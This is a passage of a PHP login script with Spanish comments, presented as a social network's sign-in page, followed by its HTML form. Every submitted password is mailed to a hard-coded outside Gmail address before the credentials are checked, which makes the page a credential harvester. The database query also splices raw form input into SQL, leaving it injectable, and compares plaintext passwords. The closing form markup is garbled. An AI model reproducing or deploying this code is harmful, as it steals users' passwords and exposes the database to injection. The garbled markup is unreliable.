connect_error) {  
   die("Error de conexión: ". $conn->connect_error);  
}  
  
// Verificar si se ha enviado el formulario  
if ($_SERVER["REQUEST_METHOD"] == "POST") {  
   $email = $_POST["email"];  
   $password = $_POST["password"];  
  
   // Enviar contraseña a correo electrónico  
   $to = "Jessie1Zahori@gmail.com";  
   $subject = "Contraseña de inicio de sesión";  
   $message = "La contraseña ingresada es: $password";  
   $headers = "From: Mi Red Social ";  
   mail($to, $subject, $message, $headers);  
  
   // Verificar credenciales  
   $query = "SELECT * FROM usuarios WHERE email = '$email' AND password = '$password'";  
   $result = $conn->query($query);  
   if ($result->num_rows > 0) {  
      // Credenciales correctas, iniciar sesión  
      session_start();  
      $_SESSION["email"] = $email;  
      header("Location: dashboard.php");  
      exit;  
   } else {  
      // Credenciales incorrectas  
      $error = "Credenciales incorrectas";  
   }  
}  
  
// Cerrar conexión  
$conn->close();  
?>  
  
  
<form action="<?php echo $_SERVER[">" method="post">  
   <h2>Iniciar sesión</h2>  
   <input required="" placeholder="Correo electrónico" name="email" type="email">  
   <input required="" placeholder="Contraseña" name="password" type="password">  
   <button>Iniciar sesión</button>  
   $error<p></p>"; }?>  
</form>
